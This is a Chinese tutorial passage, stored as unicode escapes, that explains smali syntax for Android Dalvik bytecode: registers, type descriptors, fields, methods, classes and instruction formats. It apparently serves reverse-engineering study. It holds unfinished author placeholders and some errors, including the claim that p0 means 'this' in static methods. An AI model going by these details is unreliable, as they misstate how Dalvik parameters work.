\u5982\u679c\u7c7b\u5b9e\u73b0\u4e86\u63a5\u53e3\uff0c\u5bf9\u5e94\u7684\u63a5\u53e3\u4fe1\u606f \u5982\u679c\u7c7b\u4f7f\u7528\u4e86\u6ce8\u89e3\uff0c\u5bf9\u5e94\u7684\u6ce8\u89e3\u4fe1\u606f \u5b57\u6bb5\u63cf\u8ff0 \u65b9\u6cd5\u63cf\u8ff0 \u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0cSmali \u4ee3\u7801\u57fa\u672c\u4e0a\u8fd8\u539f\u4e86 java \u4ee3\u7801\u4e2d\u542b\u4e49\u3002\u5b83\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u79cd\u7c7b\u578b\u7684\u8bed\u53e5 \u58f0\u660e\u8bed\u53e5\u7528\u6765\u58f0\u660e java \u4e2d\u81ea\u9876\u5411\u4e0b\u7684\u7c7b\uff0c\u65b9\u6cd5\uff0c\u53d8\u91cf\u7c7b\u578b\uff0c\u4ee5\u53ca\u6bcf\u4e2a\u65b9\u6cd5\u4e2d\u6240\u8981\u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u7684\u4e2a\u6570\u7b49\u4fe1\u606f\u3002 \u6267\u884c\u8bed\u53e5\u6765\u6267\u884c java \u4e2d\u7684\u6bcf\u4e00\u884c\u4ee3\u7801\uff0c\u5305\u542b\u65b9\u6cd5\u7684\u8c03\u7528\uff0c\u5b57\u6bb5\u7684\u8bfb\u5199\uff0c\u5f02\u5e38\u7684\u6355\u6349\u7b49\u64cd\u4f5c\u3002 \u6574\u4f53\u6765\u8bf4\uff0cSmali \u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u8fd8\u662f\u6bd4\u8f83\u5f3a\u7684\u3002 \u58f0\u660e\u8bed\u53e5 \u00b6 \u5728 smali \u4ee3\u7801\u4e2d\uff0c\u58f0\u660e\u8bed\u53e5\u4e00\u822c\u90fd\u662f\u4ee5 . \u5f00\u59cb\u3002 \u5bc4\u5b58\u5668 \u00b6 \u76ee\u524d\uff0cDalvik \u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u90fd\u662f 32 \u4f4d\uff0c\u5bf9\u4e8e 64 \u4f4d\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u5982 double \u7c7b\u578b\uff0c\u5b83\u4f1a\u4f7f\u7528\u4e24\u4e2a\u76f8\u90bb\u7684 32 \u4f4d\u5bc4\u5b58\u5668\u6765\u8868\u793a\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u77e5\u9053 Dalvik \u6700\u591a\u652f\u6301 65536 \u4e2a\u5bc4\u5b58\u5668(\u7f16\u53f7\u4ece 0~65535 )\uff0c\u4f46\u662f ARM \u67b6\u6784\u7684 cpu \u4e2d\u53ea\u6709 37 \u4e2a\u5bc4\u5b58\u5668\u3002\u90a3 Dalvik \u662f\u600e\u4e48\u505a\u7684\u5462\uff1f\u5176\u5b9e\uff0c\u6bcf\u4e2a Dalvik \u865a\u62df\u673a\u7ef4\u62a4\u4e86\u4e00\u4e2a\u8c03\u7528\u6808\uff0c\u8be5\u8c03\u7528\u6808\u7528\u6765\u652f\u6301\u865a\u62df\u5bc4\u5b58\u5668\u548c\u771f\u5b9e\u5bc4\u5b58\u5668\u76f8\u4e92\u6620\u5c04\u7684\u3002 \u5bc4\u5b58\u5668\u58f0\u660e \u00b6 \u5728\u6267\u884c\u5177\u4f53\u65b9\u6cd5\u65f6\uff0cDalvik \u4f1a\u6839\u636e .registers \u6307\u4ee4\u6765\u786e\u5b9a\u8be5\u51fd\u6570\u8981\u7528\u5230\u7684\u5bc4\u5b58\u5668\u6570\u76ee\uff0c\u865a\u62df\u673a\u4f1a\u6839\u636e\u7533\u8bf7\u7684\u5bc4\u5b58\u5668\u7684\u6570\u76ee\u6765\u4e3a\u8be5\u65b9\u6cd5\u5206\u914d\u76f8\u5e94\u5927\u5c0f\u7684\u6808\u7a7a\u95f4\uff0cdalvik \u5728\u5bf9\u8fd9\u4e9b\u5bc4\u5b58\u5668\u64cd\u4f5c\u65f6\uff0c\u5176\u5b9e\u90fd\u662f\u5728\u64cd\u4f5c\u6808\u7a7a\u95f4\u3002 \u5bc4\u5b58\u5668\u547d\u540d\u89c4\u5219 \u00b6 \u4e00\u4e2a\u65b9\u6cd5\u6240\u7533\u8bf7\u7684\u5bc4\u5b58\u5668\u4f1a\u5206\u914d\u7ed9\u51fd\u6570\u65b9\u6cd5\u7684\u53c2\u6570 (parameter) \u4ee5\u53ca\u5c40\u90e8\u53d8\u91cf (local variable) \u3002\u5728 smali \u4e2d\uff0c\u4e00\u822c\u6709\u4e24\u79cd\u547d\u540d\u89c4\u5219 v \u547d\u540d\u6cd5 p \u547d\u540d\u6cd5 \u5047\u8bbe\u65b9\u6cd5\u7533\u8bf7\u4e86 m+n \u4e2a\u5bc4\u5b58\u5668\uff0c\u5176\u4e2d\u5c40\u90e8\u53d8\u91cf\u5360 m \u4e2a\u5bc4\u5b58\u5668\uff0c\u53c2\u6570\u5360 n \u4e2a\u5bc4\u5b58\u5668\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684\u547d\u540d\u89c4\u5219\uff0c\u5176\u76f8\u5e94\u7684\u547d\u540d\u5982\u4e0b \u5c5e\u6027 v\u547d\u540d\u6cd5 p\u547d\u540d\u6cd5 \u5c40\u90e8\u53d8\u91cf v_0,v_1,...,v_{m-1} v_0,v_1,...,v_{m-1} v_0,v_1,...,v_{m-1} v_0,v_1,...,v_{m-1} \u51fd\u6570\u53c2\u6570 v_m,v_{m+1},...,v_{m+n} v_m,v_{m+1},...,v_{m+n} p_0,p_1,...,p_{n-1} p_0,p_1,...,p_{n-1} \u4e00\u822c\u6765\u8bf4\u6211\u4eec\u66f4\u503e\u5411\u4e8e p \u547d\u540d\u6cd5\uff0c\u56e0\u4e3a\u5176\u5177\u6709\u8f83\u597d\u7684\u53ef\u8bfb\u6027\uff0c\u53ef\u4ee5\u65b9\u4fbf\u5730\u8ba9\u6211\u4eec\u77e5\u9053\u5bc4\u5b58\u5668\u5c5e\u4e8e\u54ea\u4e00\u79cd\u7c7b\u578b\u3002 \u800c\u8fd9\u5176\u5b9e\u4e5f\u5c31\u662f smali \u8bed\u6cd5\u4e2d\u5e38\u89c1\u7684\u5bc4\u5b58\u5668\u547d\u540d\u89c4\u5219\uff0cp \u5f00\u5934\u7684\u5bc4\u5b58\u5668\u90fd\u662f\u53c2\u6570\u5bc4\u5b58\u5668\uff0cv \u5f00\u5934\u7684\u5bc4\u5b58\u5668\u90fd\u662f\u5c40\u90e8\u53d8\u91cf\u5bc4\u5b58\u5668\uff0c\u4e24\u8005\u7684\u6570\u91cf\u4e4b\u548c\u4e3a\u65b9\u6cd5\u7533\u8bf7\u7684\u5bc4\u5b58\u5668\u6570\u91cf\u3002 \u53d8\u91cf\u7c7b\u578b \u00b6 \u5728 Dalvik \u5b57\u8282\u7801\u4e2d\uff0c\u53d8\u91cf\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\u7c7b\u578b \u7c7b\u578b \u6210\u5458 \u57fa\u672c\u7c7b\u578b boolean\uff0cbyte\uff0cshort\uff0cchar\uff0cint\uff0clong\uff0cfloat\uff0cdouble\uff0cvoid\uff08\u53ea\u7528\u4e8e\u8fd4\u56de\u503c\u7c7b\u578b\uff09 \u5f15\u7528\u7c7b\u578b \u5bf9\u8c61\uff0c\u6570\u7ec4 \u4f46\u662f\uff0c\u6211\u4eec\u5728 smali \u4e2d\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u628a\u4e00\u4e2a\u53d8\u91cf\u7684\u7c7b\u578b\u7684\u63cf\u8ff0\u7684\u5168\u79f0\u5168\u90e8\u653e\u8fdb\u53bb\uff0c\u6211\u4eec\u53ea\u9700\u8981\u53ef\u4ee5\u8bc6\u522b\u5b83\u5373\u53ef\uff0c\u90a3\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u53ef\u4ee5\u5bf9\u5b83\u8fdb\u884c\u7b80\u5199\u554a\u3002dalvik \u4e2d\u7b80\u5199\u65b9\u5f0f\u5982\u4e0b java\u7c7b\u578b \u7c7b\u578b\u63cf\u8ff0\u7b26 boolean Z byte B short S char C int I long J float F double D void V \u5bf9\u8c61\u7c7b\u578b L \u6570\u7ec4\u7c7b\u578b [ \u5176\u4e2d\u5bf9\u8c61\u7c7b\u578b\u53ef\u4ee5\u8868\u793aJava\u4ee3\u7801\u4e2d\u7684\u6240\u6709\u7c7b\u3002\u6bd4\u5982\u8bf4\u5982\u679c\u4e00\u4e2a\u7c7b\u5728java\u4ee3\u7801\u4e2d\u7684\u4ee5package.name.ObjectName\uff08\u5168\u540d\uff09\u7684\u65b9\u5f0f\u88ab\u5f15\u7528\uff0c\u90a3\u4e48\u5728Davilk\u4e2d\uff0c\u5176\u63cf\u8ff0\u5219\u662f Lpackage/name/ObjectName; \uff0c\u5176\u4e2d L\u5373\u4e0a\u9762\u6240\u8bf4\u7684\u5bf9\u8c61\u7c7b\u578b\u3002 \u5168\u540d\u4e2d\u7684 . \u88ab\u66ff\u6362\u4e3a / \u3002 \u540e\u9762\u8ddf\u4e86\u4e00\u4e2a ; \u3002 \u6bd4\u5982\u8bf4\u5728 java.lang.String \uff0c\u5176\u76f8\u5e94\u7684\u5f62\u5f0f\u4e3a Ljava/lang/String; \u6ce8\uff1a\u6240\u8c13\u5168\u540d\u5c31\u662f\u5b83\u7684\u5168\u7a0b\u4e0d\u4ec5\u4ec5\u662f\u7b80\u5199\uff0c\u6bd4\u5982String\u5176\u5b9e\u662fjava.lang.String\u3002 \u6570\u7ec4\u7c7b\u578b\u53ef\u4ee5\u8868\u793ajava\u4e2d\u7684\u6240\u6709\u6570\u7ec4\u3002\u5176\u4e00\u822c\u7684\u6784\u6210\u5f62\u5f0f\u7531\u524d\u5411\u540e\u4f9d\u6b21\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206 \u6570\u7ec4\u7ef4\u6570 \u4e2a[\uff0c\u4f46\u6570\u7ec4\u7684\u7ef4\u6570\u6700\u591a\u4e3a255\u3002 \u6570\u636e\u5143\u7d20\u7c7b\u578b\uff0c\u8fd9\u91cc\u7684\u7c7b\u578b\u81ea\u7136\u5c31\u4e0d\u80fd\u662f[\u4e86\u3002 \u6bd4\u5982\u8bf4int\u6570\u7ec4 int [] \u5728smali\u4e2d\u7684\u8868\u793a\u5f62\u5f0f\u4e3a [I \u3002 \u6bd4\u5982\u8bf4\u6570\u7ec4\u7c7b\u578b String[][] \u5728smali\u4e2d\u7684\u8868\u793a\u5f62\u5f0f\u4e3a [[Ljava/lang/String; \u3002 \u5b57\u6bb5 \u00b6 \u5728 java \u7684\u7c7b\u4e2d\uff0c\u4e00\u822c\u90fd\u4f1a\u6709\u6210\u5458\u53d8\u91cf\uff0c\u4e5f\u79f0\u4e3a\u5176\u5c5e\u6027\u6216\u8005\u5b57\u6bb5\u3002java\u4e2d\u7684\u5b57\u6bb5\u5206\u4e3a \u666e\u901a\u5b57\u6bb5\uff0c\u5b9e\u4f8b\u5c5e\u6027 \u9759\u6001\u5b57\u6bb5\uff0c\u7c7b\u5c5e\u6027\uff0c\u6240\u6709\u7684\u7c7b\u5b9e\u4f8b\u5171\u4eab\u3002 \u666e\u901a\u5b57\u6bb5 \u00b6 \u58f0\u660e\u5982\u4e0b #instance fields .field <\u8bbf\u95ee\u6743\u9650\u4fee\u9970\u7b26> [\u975e\u6743\u9650\u4fee\u9970\u7b26] <\u5b57\u6bb5\u540d>:<\u5b57\u6bb5\u7c7b\u578b> \u5176\u4e2d\u8bbf\u95ee\u6743\u9650\u4fee\u9970\u7b26\u53ef\u4ee5\u4e3a public private protected \u975e\u6743\u9650\u4fee\u9970\u7b26\u53ef\u4ee5\u4e3a( \u67e5\u660e\u5176\u7528\u6cd5!!! ) final volidate transient \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5982\u4e0b # instance fields .field private str1 : L java/lang/ String ; \u8fd9\u91cc\u58f0\u660e\u5176\u5b9e\u5982\u4e0b private java . lang . String str1 ; \u9759\u6001\u5b57\u6bb5 \u00b6 \u4e00\u822c\u8868\u793a\u5982\u4e0b #static fields .field <\u8bbf\u95ee\u6743\u9650> static [ \u4fee\u9970\u8bcd] <\u5b57\u6bb5\u540d> : <\u5b57\u6bb5\u7c7b\u578b> \u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u4ecb\u7ecd\u76f8\u5e94\u5185\u5bb9\u4e86\uff0c\u76f4\u63a5\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 # instance fields .field public static str2:Ljava/lang/String; \u5176\u5b9e\u58f0\u660e\u5982\u4e0b public static java . lang . String str2 ; \u65b9\u6cd5 \u00b6 \u5728 smali \u4ee3\u7801\u4e2d\uff0c\u65b9\u6cd5\u4e00\u822c\u7684\u5c55\u73b0\u5f62\u5f0f\u5982\u4e0b # \u63cf\u8ff0\u65b9\u6cd5\u7c7b\u578b .method <\u8bbf\u95ee\u6743\u9650\u4fee\u9970\u7b26> [\u4fee\u9970\u7b26] <\u65b9\u6cd5\u539f\u578b> <.locals> [.parameter] [.prologue] [.line] <\u4ee3\u7801\u903b\u8f91> [.line] <\u4ee3\u7801\u903b\u8f91> .end \u5176\u4e2d\u7b2c\u4e00\u884c\u4ee5\u6ce8\u91ca\u5f62\u5f0f\u63cf\u8ff0\u65b9\u6cd5\u7684\u7c7b\u578b\uff0c\u4e00\u822c\u662f\u53cd\u7f16\u8bd1\u5de5\u5177\u6dfb\u52a0\u4e0a\u53bb\u7684\uff0c\u5206\u4e3a\u4e24\u79cd\u7c7b\u578b \u76f4\u63a5\u65b9\u6cd5\uff0cdirect method \u865a\u65b9\u6cd5\uff0cvirtual method \u8bbf\u95ee\u6743\u9650\u53ef\u80fd\u6709\u6709\u4ee5\u4e0b\u5f62\u5f0f\uff0c\u4e0e java \u4e2d\u7684\u4e00\u4e00\u5bf9\u5e94 public private protected \u4fee\u9970\u7b26\u4e3b\u8981\u6709\u4ee5\u53d6\u503c\u8303\u56f4 static\uff0c\u8868\u660e\u8be5\u65b9\u6cd5\u662f\u9759\u6001\u65b9\u6cd5 \u65b9\u6cd5\u539f\u578b\u4e00\u822c\u4e3a \u65b9\u6cd5\u540d(\u53c2\u6570\u7c7b\u578b\u63cf\u8ff0\u7b26)\u8fd4\u56de\u503c\u7c7b\u578b\u63cf\u8ff0\u7b26 \u3002\u4e0ejava\u65b9\u6cd5\u4e2d\u4e0d\u4e00\u6837\u7684\u662f\uff0c\u5728 smali \u7684\u8fd9\u4e2a\u65b9\u6cd5\u539f\u578b\u4e2d\u4e0d\u4f1a\u6709\u53c2\u6570\u5bf9\u5e94\u7684\u540d\u5b57\u7684\uff0c\u5bf9\u5e94\u53c2\u6570\u7684\u540d\u5b57\u53ef\u80fd\u4f1a\u5728.parameter\u4e2d\u8fdb\u884c\u6307\u5b9a\u3002 .locals \u4f1a\u6307\u5b9a\u65b9\u6cd5\u4f7f\u7528\u7684\u5c40\u90e8\u53d8\u91cf\u3002 .parameter \u7684\u4e2a\u6570\u4e0e\u65b9\u6cd5\u7684\u4f7f\u7528\u7684\u53c2\u6570\u683c\u5f0f\u4e00\u81f4\uff0c\u6bcf\u4e00\u6761\u8bed\u53e5\u58f0\u660e\u4e00\u4e2a\u53c2\u6570\u3002\u5982\u679c\u65b9\u6cd5\u662f\u9759\u6001\u65b9\u6cd5\u7684\u8bdd\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528 p0 \u6765\u8868\u793athis\uff0c\u5373\u5f53\u524d\u5bf9\u8c61\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u53c2\u6570\u5c31\u6b63\u5e38\u7528 p0 \u5f00\u59cb\u3002 .prologue \u6307\u5b9a\u7a0b\u5e8f\u7684\u5f00\u59cb\u5904\u3002\u6df7\u6dc6\u8fc7\u540e\u7684\u4ee3\u7801\u53ef\u80fd\u4f1a\u6ca1\u6709\u8fd9\u4e00\u8bf4\u660e\u3002 .line \u6307\u5b9a\u76f8\u5e94\u7684\u4ee3\u7801\u5728\u539f java \u6587\u4ef6\u7684\u884c\u6570\u3002\u5982\u679c\u7a0b\u5e8f\u8fdb\u884c\u4e86\u6df7\u6dc6\uff0c\u4e00\u822c\u5c31\u4e0d\u4f1a\u6709\u8fd9\u4e00\u884c\u4e86\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\uff0c\uff0c\uff0c\u627e\u4e2a\u5408\u9002\u7684\u4f8b\u5b50!!!!!! \u7c7b \u00b6 \u57fa\u672c\u7c7b\u4fe1\u606f \u00b6 \u5982\u4e0b .class <\u8bbf\u95ee\u6743\u9650\u4fee\u9970\u7b26> [\u975e\u6743\u9650\u4fee\u9970\u7b26] <\u7c7b\u540d> .super <\u7236\u7c7b\u540d> .source <\u6e90\u6587\u4ef6\u540d\u79f0> \u5176\u4e2d\uff0c <> \u4e2d\u7684\u5185\u5bb9\u5fc5\u987b\u5b58\u5728\uff0c [] \u7684\u5185\u5bb9\u662f\u53ef\u9009\u7684\u3002\u8bbf\u95ee\u6743\u9650\u4fee\u9970\u7b26\u5373\u6240\u8c13\u7684 public \uff0c protected \uff0c private \u3002\u800c\u975e\u6743\u9650\u4fee\u9970\u7b26\u5219\u6307\u7684\u662f final \uff0c abstract \u3002\u4e3e\u4e2a\u4f8b\u5b50 .class public final L com/a/b/ c ; .super L java/lang/ Object ; .source \"Demo.java\" \u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u7c7b\u7684\u8bbf\u95ee\u6743\u9650\u662f public \uff0c\u975e\u6743\u9650\u4fee\u9970\u7b26\u4e3a final \uff0c\u7c7b\u540d\u4e3a com.a.b.c \uff0c\u5b83\u7ee7\u627f\u4e86\u7236\u7c7b java.lang.object \uff0c\u5bf9\u5e94\u7684\u6e90\u6587\u4ef6\u4e3a Demo.java \u3002 \u63a5\u53e3 \u00b6 \u5982\u679c\u4e00\u4e2a\u7c7b\u5b9e\u73b0\u4e86\u67d0\u4e2a\u63a5\u53e3\uff0c\u5219\u4f1a\u901a\u8fc7 .implements \u8fdb\u884c\uff0c\u5982\u4e0b: #interfaces .implements <\u63a5\u53e3\u540d\u79f0> \u7ed9\u4e2a\u4f8b\u5b50\uff0c\u4e00\u822c\u6765\u8bf4\uff0csmali\u90fd\u4f1a\u5bf9\u5176\u8fdb\u884c\u6ce8\u91ca\u8868\u660e\u5b83\u662f\u4e00\u4e2a\u63a5\u53e3\u3002 # interfaces .implements L android/view/ View$OnClickListener ; \u7c7b\u7684\u7c7b\u522b \u00b6 Java\u4e2d\u5141\u8bb8\u5728\u4e00\u4e2a\u7c7b\u4e2d\u5b9a\u4e49\u53e6\u5916\u4e00\u4e2a\u7c7b\uff0c\u8fd8\u5141\u8bb8\u591a\u5c42\u5d4c\u5957\uff0c\u6211\u4eec\u79f0\u7c7b\u4e2d\u7684\u7c7b\u4e3a\u5185\u90e8\u7c7b\u3002\u5185\u90e8\u7c7b\u4e3b\u8981\u6709 \u6210\u5458\u5185\u90e8\u7c7b \u9759\u6001\u5d4c\u5957\u7c7b \u65b9\u6cd5\u5185\u90e8\u7c7b \u533f\u540d\u5185\u90e8\u7c7b \u5728smali\u4e2d\uff0c\u6bcf\u4e2a\u7c7b\u90fd\u4f1a\u5bf9\u5e94\u4e00\u4e2asmali\u6587\u4ef6\u3002 \u7c7b\u7684\u5f15\u7528 \u00b6 \u5728smali\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528 this \u6765\u8868\u793a\u7236\u7c7b\u7684\u5f15\u7528\uff0c\u5bf9\u4e8e\u7236\u7c7b\u7684\u4e2d\u7684\u5b50\u7c7b\uff0c\u6211\u4eec\u4f1a\u6839\u636e\u5176\u5c42\u6570\u6765\u8fdb\u884c\u5f15\u7528\uff0c\u5176\u683c\u5f0f\u4e3a this$[\u5c42\u6570] \uff0c\u4e3e\u4e2a\u4f8b\u5b50 public class MainActivity extends Activity { //this$0 public class firstinner //this$1 { public class secondinner //this$2 { public class thirdinner //this$3 { } } } } \u6bd4\u5982\u8bf4 thirdinner \u5f15\u7528 firstinner \u5176\u4f1a\u4f7f\u7528 this$1 \u6765\u8fdb\u884c\u5f15\u7528\u3002\u800c\u4e14\uff0c\u5bf9\u4e8e this$x \u8fd9\u6837\u7684\u5b57\u6bb5\u90fd\u4f1a\u88ab\u5b9a\u4e49\u4e3a synthetic \u7c7b\u578b\uff0c\u8868\u660e\u8fd9\u79cd\u5b57\u6bb5\u662f\u7531\u7f16\u8bd1\u5668\u81ea\u52a8\u751f\u6210\u7684\uff0c\u5728\u6e90\u4ee3\u7801\u91cc\u5e76\u6ca1\u6709\u8fd9\u6837\u7684\u5b57\u6bb5\u3002 \u6b64\u5916\uff0c\u5728smali\u4e2d\uff0c\u6bcf\u4e2a\u7c7b\u90fd\u4f1a\u5bf9\u5e94\u4e00\u4e2a smali \u6587\u4ef6\uff0c\u8fd9\u51e0\u4e2a\u7c7b\u5bf9\u5e94\u7684 smali \u6587\u4ef6\u540d\u5206\u522b\u4e3a MainActivity.smali MainActivity$firstinner.smali MainActivity$firstinner$secondinner.smali MainActivity$firstinner$thirdinner.smali \u6ce8\u89e3 \u00b6 \u6ce8\u89e3\u7684\u683c\u5f0f\u5982\u4e0b #annotations .annotation [ \u6ce8\u89e3\u7684\u5c5e\u6027] <\u6ce8\u89e3\u8303\u56f4> [ \u6ce8\u89e3\u5b57\u6bb5 = \u503c] ... . end \u5176\u4e2d\uff0c\u5982\u679c\u6ce8\u89e3\u8303\u56f4\u662f\u7c7b\u7684\u8bdd\uff0c\u6ce8\u89e3\u4f1a\u76f4\u63a5\u51fa\u73b0\u5728 smali \u6587\u4ef6\u4e2d\u3002\u5982\u679c\u6ce8\u89e3\u8303\u56f4\u662f\u65b9\u6cd5\u6216\u8005\u5b57\u6bb5\u7684\u8bdd\uff0c\u4f1a\u5305\u542b\u5728\u76f8\u5e94\u7684\u65b9\u6cd5\u6216\u8005\u5b57\u6bb5\u7684\u5b9a\u4e49\u4e2d\u3002 \u6267\u884c\u8bed\u53e5 \u00b6 \u8fd9\u91cc\u90e8\u5206\u53c2\u8003http://blog.csdn.net/wizardforcel/article/details/54730253\u3002 Dalvik\u6307\u4ee4\u683c\u5f0f \u00b6 \u5728\u4ecb\u7ecd smali \u8bed\u6cd5\u4e2d\u7684\u6307\u4ee4\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u6765\u770b\u770b Dalvik \u6307\u4ee4\u7684\u57fa\u672c\u683c\u5f0f\u3002 Dalvik \u4e2d\u6307\u4ee4\u7684\u683c\u5f0f\u4e3b\u8981\u5305\u542b\u4e24\u4e2a\u65b9\u9762\uff1a\u4f4d\u63cf\u8ff0\uff0c\u683c\u5f0fID\u3002\u76ee\u524d Dalvik \u4e2d\u57fa\u672c\u4e0a\u6240\u6709\u7684\u6307\u4ee4\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u5176\u4e2d\u7b2c\u4e00\u5217\u7ed9\u51fa\u4e86\u6307\u4ee4\u6309\u7167\u4f4d\u8fdb\u884c\u63cf\u8ff0\u7684\u683c\u5f0f\uff0c\u7b2c\u4e8c\u5217\u662f\u683c\u5f0f\u5316 ID \uff0c\u7b2c\u4e09\u5217\u8868\u793a\u76f8\u5e94\u7684\u53e5\u6cd5\uff0c\u7b2c\u56db\u5217\u5bf9\u5176\u8fdb\u884c\u8bf4\u660e\u3002 \u4f4d\u63cf\u8ff0 \u00b6 \u5728\u4f4d\u63cf\u8ff0\u4e2d\uff0cDavik \u4e2d\u7684\u6bcf\u4e00\u7c7b\u6307\u4ee4\u4e00\u822c\u7531\u5982\u4e0b\u7684\u5143\u7d20\u6784\u6210 \u4e00\u4e2aop\uff0c8\u4f4d\u6307\u4ee4\u7801 \u82e5\u5e72\u4e2a\u5b57\u7b26\uff0c\u6bcf\u4e00\u4e2a\u5b57\u7b26\u8868\u793a4\u4f4d \u82e5\u5e72\u4e2a | \uff0c\u8fdb\u884c\u5206\u5272\uff0c\u65b9\u4fbf\u9605\u8bfb\u3002 \u82e5\u5e72\u4e2a \\varnothing \\varnothing \uff0c\u540c\u6837\u4e5f\u662f4\u4e2a\u5b57\u7b26\uff0c\u8868\u793a\u8be5\u90e8\u5206\u4f4d\u4e3a0\u3002 \u6b64\u5916\uff0c\u5728\u4e0a\u9762\u7684\u5c55\u73b0\u5f62\u5f0f\u79cd\uff0c\u6307\u4ee4\u7531\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u7a7a\u683c\u5206\u5272\u7684 16 \u4f4d\u7684 word \u7ec4\u6210\uff0c\u5176\u4e2d\u6bcf\u4e00\u4e2a word \u53ef\u4ee5\u5305\u542b\u4e0a\u8ff0\u7684\u51e0\u4e2a\u5143\u7d20\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6307\u4ee4 B|A|op CCCC \u5305\u542b2\u4e2a word\uff0c\u4e00\u5171 32 \u4f4d\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u5b57\u7684\u4f4e 8 \u4f4d\u662f\u64cd\u4f5c\u7801\uff0c\u4e2d\u95f4 4 \u4f4d\u662fA\uff0c\u9ad84\u4f4d\u662fB\u3002\u7b2c\u4e8c\u4e2a\u5b57\u662f\u5355\u72ec\u768416\u4f4d\u7684\u6570\u503c\u3002 \u683c\u5f0fID \u00b6 \u4f46\u662f\uff0c\u6b63\u5982\u8868\u683c\u91cc\u6240\u5c55\u73b0\u7684 \u8fd9\u6837\u7684\u4e00\u79cd\u6307\u4ee4\u683c\u5f0f\uff0c\u6839\u636eID\u7684\u4e0d\u540c\uff0c\u4ecd\u7136\u53ef\u4ee5\u8868\u793a\u4e0d\u540c\u7684\u6307\u4ee4\u542b\u4e49\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u683c\u5f0fID\u7531\u82e5\u5e72\u4e2a\u5b57\u7b26\u7ec4\u6210\uff0c\u4e00\u822c\u6765\u8bf4\u5305\u542b3\u4e2a\u5b57\u7b26 \u7b2c\u4e00\u4e2a\u6570\u5b57\u8868\u793aword\u7684\u6570\u91cf \u7b2c\u4e8c\u4e2a \u6570\u5b57\u7684\u8bdd\uff0c\u8868\u793a\u6307\u4ee4\u5305\u542b\u7684\u5bc4\u5b58\u5668\u7684\u6700\u5927\u6570\u91cf\uff08\u8fd9\u662f\u56e0\u4e3a\u6709\u4e9b\u6307\u4ee4\u53ef\u4ee5\u5305\u542b\u4e0d\u5b9a\u4e2a\u6570\u7684\u5bc4\u5b58\u5668\uff09 r\u7684\u8bdd\uff0c\u8868\u793a\u4f7f\u7528\u4e86\u4e00\u5b9a\u8303\u56f4\u5185\u7684\u5bc4\u5b58\u5668(range)\u3002 \u7b2c\u4e09\u4e2a\u5b57\u7b26\u8868\u793a\u6307\u4ee4\u4f7f\u7528\u5230\u7684\u989d\u5916\u6570\u636e\u7684\u7c7b\u578b\u3002\u5982\u4e0b\u8868 Mnemonic Bit Sizes Meaning b 8 immediate signed byte c 16, 32 constant pool index f 16 interface constants (only used in statically linked formats) h 16 immediate signed hat (high-order bits of a 32- or 64-bit value; low-order bits are all 0 ) i 32 immediate signed int, or 32-bit float l 64 immediate signed long, or 64-bit double m 16 method constants (only used in statically linked formats) n 4 immediate signed nibble s 16 immediate signed short t 8, 16, 32 branch target x 0 no additional data \u5982\u679c\u5b58\u5728\u7b2c\u56db\u4e2a\u5b57\u7b26\u7684\u8bdd s\u8868\u793a\u91c7\u7528\u9759\u6001\u94fe\u63a5 i\u8868\u793a\u6307\u4ee4\u5e94\u8be5\u88ab\u5185\u8054\u5904\u7406\u3002 \u53e5\u6cd5 \u00b6 \u5176\u57fa\u672c\u8981\u6c42\u5982\u4e0b \u6307\u4ee4\u4ee5\u64cd\u4f5c\u7801op\u5f00\u59cb\uff0c\u540e\u9762\u76f4\u63a5\u8ddf\u4e0a\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u53c2\u6570\uff0c\u53c2\u6570\u95f4\u4ee5\u9017\u53f7\u5206\u9694\u3002 \u6307\u4ee4\u7684\u53c2\u6570\u4ece\u6307\u4ee4\u7b2c\u4e00\u90e8\u5206\u5f00\u59cb\uff0cop\u4f4d\u4e8e\u4f4e8\u4f4d\uff0c\u9ad88\u4f4d\u53ef\u4ee5\u662f\u4e00\u4e2a8\u4f4d\u7684\u53c2\u6570\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e24\u4e2a4\u4f4d\u7684\u53c2\u6570\uff0c\u8fd8\u53ef\u4ee5\u4e3a\u7a7a\u3002\u5982\u679c\u6307\u4ee4\u8d85\u8fc716\u4f4d\uff0c\u5219\u540e\u9762\u90e8\u5206\u4f9d\u6b21\u4f5c\u4e3a\u53c2\u6570\u3002 \u53c2\u6570 Vx \u8868\u793a\u5bc4\u5b58\u5668\uff0c\u5982v0\u3001v1\u7b49\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u91c7\u7528v\u800c\u4e0d\u7528r\u662f\u4e3a\u4e86\u907f\u514d\u4e0e\u5b9e\u73b0\u8be5\u865a\u62df\u673a\u67b6\u6784\u7684\u673a\u5668\u67b6\u6784\u4e2d\u7684\u5bc4\u5b58\u5668\u547d\u540d\u4ea7\u751f\u51b2\u7a81\u3002 \u53c2\u6570 #+X \u8868\u793a\u5e38\u91cf\u6570\u5b57\u3002 \u53c2\u6570 +X \u8868\u793a\u76f8\u5bf9\u6307\u4ee4\u7684\u5730\u5740\u504f\u79fb\u3002 \u53c2\u6570 kind@X 